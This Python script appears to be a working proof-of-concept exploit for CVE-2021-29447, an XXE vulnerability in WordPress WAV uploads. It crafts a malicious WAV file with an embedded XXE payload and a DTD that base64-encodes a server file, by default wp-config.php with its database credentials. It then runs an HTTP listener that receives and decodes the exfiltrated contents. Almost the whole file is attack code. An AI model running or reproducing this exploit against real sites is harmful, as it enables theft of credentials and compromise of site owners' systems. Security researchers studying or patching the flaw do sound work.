import sys, getopt
import struct
from os import curdir, sep
import subprocess
from urllib.parse import urlparse
from http.server import HTTPServer, BaseHTTPRequestHandler

class  HTTPHandler(BaseHTTPRequestHandler):
    rfile = ''
    def do_GET(self):
        parsed_path = urlparse(self.path)
        client = self.client_address
        print(client[0])
        data = parsed_path.query
        if data == "":
            self.send_response(200)
            self.send_header('Content-Type', 'application/xml')
            self.end_headers()
            try:
                with open(curdir + sep + self.path, "rb") as f:
                    self.wfile.write(f.read())
            except FileNotFoundError:
                pass
            return
        else:
            self.send_response(200)
            exfil = data.split("=")[1]
            print(self.rfile)
            subprocess.Popen(f"php -r \"echo zlib_decode(base64_decode('{exfil}'));\" >> {client[0]}.{self.rfile}", shell=True)

            #with open(client[0] + "_exfil", "w") as f:
            #    f.write(data.split("=")[1])
            return

def prepare_payload(lhost, lport, rfile):
    
    payload = f"""<?xml version=\"1.0\"?><!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY % sp SYSTEM "http://{lhost}:{lport}/xxe.dtd">%sp;%param1;]><r>&exfil;</r>\x00""".encode()
    xxe_file = f"""<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource={rfile}"><!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://{lhost}:{lport}/xxe.dtd?c=%data;'>">"""

    # build header
    riff_id = b'RIFF'
    file_size = 20 + len(payload) # 20 because of shortened WAV header -- a real one has 32 bytes
    wav_format = b'WAVE'

    header = struct.pack('<4sI4s', riff_id, file_size, wav_format) 

    # build body
    xml_id = b'iXML'
    plength = len(payload)

    body = struct.pack('<4sI', xml_id, plength) + payload
    
    with open("payload.wav", "wb") as wav_file:
        wav_file.write(header)
        wav_file.write(body)
        print("[+] Payload written to disk")

    with open("xxe.dtd", "w") as dtd_file:
        dtd_file.write(xxe_file)
        print("[+] DTD file written to disk")
    
def serve_files(lhost, lport, rfile):
    # stand up http server
    try:
        server = HTTPServer((lhost, int(lport)), HTTPHandler)
        server.rfile = rfile
        print(server.rfile)
        print("[+] starting http server")
        server.serve_forever()
    except KeyboardInterrupt:
        print("[+] Killing http server")
        server.socket.close()
    return

def main(argv):
    lhost = ''
    lport = ''
    rfile = ''
    wav_contents = ''
    flength = ''
    plength = ''

    try:
        opts, args = getopt.getopt(argv, "hH:p:f:")
    except getopt.GetoptError:
        print("cve-2021-29447.py -H <address of local http server> -p <http server listening port> -f <remote file to retrieve>")
        sys.exit(2)

    for opt, arg in opts:
        if opt == "-h":
            print("cve-2021-29447.py -H <address of local http server> -p <http server listening port> -f <remote file to retrieve>")
            sys.exit()
        elif opt in ("-H"):
            lhost = arg
        elif opt in ("-p"):
            lport = arg
        elif opt in ("-f"):
            rfile = arg

    if rfile == '':
        rfile = "../wp-config.php"

    prepare_payload(lhost, lport, rfile)
    serve_files(lhost, lport, rfile)

    print("[+] Exploit done")


if __name__ == "__main__":
    main(sys.argv[1:])